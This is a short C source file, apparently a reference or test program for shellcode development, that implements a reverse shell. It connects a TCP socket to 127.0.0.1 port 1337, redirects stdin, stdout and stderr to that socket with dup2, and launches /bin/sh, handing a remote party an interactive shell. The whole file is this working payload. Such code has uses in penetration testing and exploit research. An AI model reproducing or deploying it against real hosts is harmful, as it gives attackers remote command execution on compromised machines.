#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>

int main()
{
    struct sockaddr_in addr;

    // Checking sockets syscalls.
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);   
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1337);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");    
    
    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    
    // Checking dup2 syscalls.
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);

    
    // Opening shell.
    execv("/bin/sh", NULL);
    
    return 0;
}
